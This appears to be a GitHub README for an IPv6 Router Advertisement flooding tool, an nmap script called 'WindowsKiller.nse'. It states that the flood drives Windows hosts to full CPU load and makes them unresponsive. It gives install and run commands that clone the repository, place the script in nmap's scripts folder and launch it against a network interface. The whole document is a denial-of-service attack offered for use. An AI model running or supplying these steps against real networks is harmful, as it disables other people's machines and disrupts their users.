# IPv6-Router-Advertisement-DoS

Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS), will start to compute IPv6 suffix and update their routing table to reflect the accepted announcement. This will cause 100% CPU usage on Windows and platforms, preventing to process other application requests.

# Install

git clone https://github.com/Kleptocratic/IPv6-Router-Advertisement-DoS.git

# Check for location of other NSE scripts

find / -name '*.nse'

# Move downloaded files into directory

sudo mv WindowsKiller.nse /usr/local/share/nmap/scripts/

# Execute script

nmap -6 --script WindowsKiller.nse --script-args 'interface=<interface>'
